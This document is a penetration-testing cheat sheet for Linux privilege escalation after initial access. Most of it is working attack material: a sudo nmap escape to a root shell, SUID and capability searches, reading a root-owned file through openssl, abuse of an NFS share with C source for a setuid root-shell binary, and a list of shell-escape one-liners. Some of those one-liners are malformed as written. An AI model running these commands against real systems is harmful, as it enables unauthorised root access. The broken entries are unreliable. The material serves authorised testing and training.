# LINUX
This sheet serves as a resource for processes commonly used to escalate privileges of a low-privilege user access during the post-exploitation phase of the penetration test.
## Run the LINUX Privilege Checker Python Script
If Python is installed, **make sure that this script is ran immediately** [LinuxPrivChecker Python script](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Tools/linuxprivchecker.py) upon gaining low-level access to a target system. This script will provide quick insight into possible misconfigurations in the target system.

## SUDO Test
Testing for sudo will sometimes reveal a nice surprise. The [LinuxPrivChecker Python script](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Tools/linuxprivchecker.py) will tell you exactly which commands/programs are installed with interactive shells that can be escaped from. For instance, some older version of `nmap` had a interactivbe shell. This meant that on certain systems in which a default account has non-authenticated sudo access to it, it could easily lead to a root shell.

```
bash-3.2$ ls -lah /usr/bin/nmap
ls -lah /usr/bin/nmap
-rwxr-xr-x 1 root root 523K Jan  6  2007 /usr/bin/nmap
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> ! /bin/bash
! /bin/bash
bash-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash-3.2# 
```
So, it is **very important** that all of these are tested with sudo.

To list all applications we have `sudo` access to, run,
```
user@attacker-machine:~$ sudo -l
```

## SUID Test
Some of the aforementioned applciations which can be escaped from may have a SUID bit set in the permissions. This means that the effective user ID becomes that of the file's owner. **Again, test all of these** applications, **without sudo** if the attack above is unsuccessful because some of the file permissions may not be set correctly. You'd be surprised.

```
user@target-machine:~$ find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
```
To filter out directories we can use a regexp like so,
```
user@target-machine:~$ find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null | egrep -v '^d`
```
Search for the sticky bit:
```
user@target-machine:~$ find / -perm -u=s -type f 2>/dev/null 
```
## Capabilities
Sometimes files have extra capabilities. To find special capabilities on files, you can try using the `getcap` command on every file in the file system. This can be very slow on actual physical machines - but for VMs and solid state drives, it shouldn't be too bad. You can utilize the `find` command to do this as so,
```
root@attacker-machine:~# find . * 2>/dev/null | xargs -I {} getcap {} 2>/dev/null
/usr/bin/command = cap_dac_read_search+ei
```
Then, we can try to analyze the command as a binary with `strings`, `gdb`, or test it by fuzzing, or execution trial an error.
### OpenSSL
Here is an OpenSSL example of how to utilize Unix Capabilities to read a file that you don't have read access to. If we use `openssl` which has the capabilities set as `=ep`, as shown below,
```
unprivuser@target-system:~$ find . * 2>/dev/null | xargs -I {} getcap {} 2>/dev/null
openssl =ep
```
We can run `./openssl` to encrypt a file for us, then again to decrypt it. This process essentially creates a new file which we have permission to read. Try this,
```
unprivuser@target-system:~$ ./openssl aes-256-cbc -a -salt -in /root/root.txt -out root.txt.enc
enter aes-256-cbc encryption password:
Verifying - enter aes-256-cbc encryption password:
unprivuser@target-system:~$ ls -lah
-rw-rw-r--. 1 unprivuser unprivuser   90 Jan 18 14:28 root.txt.enc
```
Now we decrypt the new file, using the password we chose during the encryption process, and we can read ikt's contents.
```
unprivuser@target-system:~$ openssl aes-256-cbc -d -a -in root.txt.enc -out root.txt
enter aes-256-cbc decryption password:
unprivuser@target-system:~$ cat root.txt
This was a privileged flag file in /root ! How did you read me!?!
unprivuser@target-system:~$
```
## Mounted Filesystems with SetUID
Is there perhaps a mounted NFS share that we can mount remotely? Maybe one with the mount options of setuid 0? We can check the compromised system with the following command,
```
user@target-machine:~$ dmesg | grep -i nfs
[    3.705522] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    3.711126] FS-Cache: Netfs 'nfs' registered for caching
[    3.721888] Installing knfsd (copyright (C) 1996 okir@monad.swb.de).
[    3.961057] NFSD: Using /var/lib/nfs/v4recovery as the NFSv4 state recovery directory
[    3.961244] NFSD: starting 90-second grace period (net c16580c0)
```
Next, we can verify the location of the NFS mount point on the target system by running the following command on the target system,
```
user@target-system:~$ /sbin/showmount -e (TARGET IP ADDRESS)
Export list for (TARGET IP ADDRESS):
/mnt/nfs/share (TARGET IP ADDRESS)/255.255.255.0
```
check the permissions of `/mnt/nfs/share` First, create a temporary mount point onthe Attacker machine and mount the remote NFS share like so,
```
root@attacker-machine:~# mkdir /mnt/nfs
root@attacker-machine:~# mount -t nfs (TARGET IP ADDRESS)/path/to/nfs /mnt/nfs -o nolock
```
Touch a file in the mount point and then check the file's permissions on the Target machine,
```
root@attacker-machine:~$ touch /mnt/nfs/file.txt
```
```
user@target-machine:~$ ls -la /mnt/nfs/share
-rw-r--r--  1 root root    0 Jan 30 13:41 file.txt
```
We see that the file was created a styhe root user. Now, we need to compile a binary that spawns a shell, set the SUID bit, and execute it on the target system.
```
#include<stdlib.h>
#include<stdio.h>
#include<unistd.h>
int main(void){
 setuid(0);
 setgid(0);
 system("/bin/bash");
 return 0;
}
```
Compile it so that the binary is on the mounted NFS share and run it,
```
root@attacker-machine:/mnt/nfs# gcc execute.c -m32 -o execute
root@attacker-machine:/mnt/nfs# chmod +s execute 
```
```
user@target-system:~$ /mnt/nfs/execute
# whoami
uid=1001(user) gid=1001(user) euid=0(root) egid=0(root) groups=0(root),1001(user)
```
Now, we have the effective user id, EUID, for execution of processes, as `root`.
## Cron Jobs
Do any cron jobs run that execute scripts or binaries that we have write access to?
```
ls -la /etc/cron*
```
## Network Check
Does the compromised system connect to an internal network or possibly other vulnerable machines? 
```
user@target-machine:~$ ifconfig
```
Does it communicate to other systems or services?
```
user@target-machine:~$ tcpdump -i eth0
```
What systems has it had recent contact with?
```
user@target-machine:~$ arp -a
```
Which DNS server is the compromised system using?
```
user@target-machine:~$ cat /etc/resolv.conf
```
What other hosts/domains does the system have routes to?
```
user@target-machine:~$ cat /etc/hosts
```

## SuDo Escape Tests
Some applications may allow you to run as super-user with `sudo`. If the program has an "escape-back-to-shell" function, it can be leveraged as a priviliege escalation vector. Here is a list of applications which have this feature. Check each one for SUID or `sudo` access from your compromised user. This requires the knownledge of the currently-compromised user account.
#### VI/VIM
* :!bash
* :set shell=/bin/bash:shell
#### Man, More, Less
* !bash
#### Find+AWK
* find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
#### AWK
awk 'BEGIN {system("/bin/bash")}'
#### NMAP
* nmap --interactive; # then "!sh"
* echo "os.execute('/bin/sh')" > exploit.nse
* sudo nmap --script=exploit.nse
#### Perl
* perl -e 'exec "/bin/bash";'
#### Python
* python -c "import pty; pty.spawn("/bin/sh")"
#### Ruby
* ruby exec "/bin/sh"
#### Echo
* echo os.system('/bin/bash')
#### FTP
* !/bin/sh

## Weak Services
We an check weak services wit the following command,
```
user@target-machine:~$ find / -perm -2 ! -type l -ls 2>/dev/null
```
Check for services with world writeable binaries or scripts.
